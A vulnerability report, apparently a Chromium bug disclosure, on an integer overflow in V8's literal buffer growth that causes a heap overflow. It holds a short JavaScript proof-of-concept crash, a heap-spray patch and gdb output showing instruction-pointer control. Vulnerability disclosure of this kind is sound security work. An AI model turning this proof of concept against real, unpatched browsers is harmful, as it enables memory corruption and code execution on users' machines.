<b>VULNERABILITY DETAILS</b>
A heap buffer overflow is possible due to an integer overflow in the
*NewCapacity* function:

```
int Scanner::LiteralBuffer::NewCapacity(int min_capacity) {
  int capacity = Max(min_capacity, backing_store_.length());
  int new_capacity = Min(capacity * kGrowthFactory, capacity + kMaxGrowth); 
  return new_capacity;
}

void Scanner::LiteralBuffer::ExpandBuffer() {
  Vector<byte> new_store = Vector<byte>::New(NewCapacity(kInitialCapacity));
  printf("Memcpy(%p, %p, 0x%x)\n", new_store.start(), backing_store_.start(), 
    position_);
  MemCopy(new_store.start(), backing_store_.start(), position_);
  backing_store_.Dispose();
  backing_store_ = new_store;
}
```

We can control `backing_store_.length()` by varying the length of a JavaScript
string. A huge JavaScript string leads to a huge `capacity` value, which can
make the expression `capacity * kGrowthFactory` overflow, so that
`new_capacity` will be set to a smaller value than the previous capacity.
In consequence, the next `MemCopy` will write more bytes into the vector than 
were previously allocated, causing memory corruption.


<b>VERSION</b>
D8 Version: V8 7.2.502
Chrome Version: Chromium 72.0.3626.0 stable
Operating System: Linux 4.15.0-42-generic x86_64 (Ubuntu)


<b>REPRODUCTION CASE</b>
```
let s = String.fromCharCode(0x4141).repeat(0x10000001) + "A";
s = "'"+s+"'";
eval(s);
```

The PoC can be directly executed with a release build of D8 via `./d8 poc.js`.
For a debug build the DCHECK in `Vector::length()` from the file
`v8/src/vector.h` needs to be removed to successfully trigger the bug.


<b>FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION</b>
Type of crash: Tab (V8 => Renderer)
Crash State: See `crash_asan.log`


EXPLOITABILITY
A simple way to demonstrate exploitability is to add a simple heap spray by
applying the patch below:

```
diff --git a/src/parsing/parsing.cc b/src/parsing/parsing.cc
index 378023cbeb..f76595f0fb 100644
--- a/src/parsing/parsing.cc
+++ b/src/parsing/parsing.cc
@@ -18,6 +18,15 @@ namespace internal {
 namespace parsing {
 
 bool ParseProgram(ParseInfo* info, Isolate* isolate) {
+  const int size = 0x20000000/0x40;
+  void** p = (void**) malloc(size * sizeof(void*));
+  for (int i = 0; i < size; i++) {
+    p[i] = malloc(0x40);
+  }
+  for (int i = 0; i < size; i++) {
+    free(p[i]);
+  }
+
   DCHECK(info->is_toplevel());
   DCHECK_NULL(info->literal());
```

Afterwards the PoC can be run with a release build of D8, demonstrating
RIP control:

```
$ gdb --args out/release/d8 poc.js

>  x/i $rip
=> 0x7ffff71f7520 <v8::internal::Utf16CharacterStream::ReadBlockChecked()+32>:	
    call   QWORD PTR [rax+0x18]
>  info reg rax
rax            0x4141414141414141	0x4141414141414141
```


<b>CREDIT INFORMATION</b>
Reporter credit: Dimitri Fourny (Blue Frost Security)
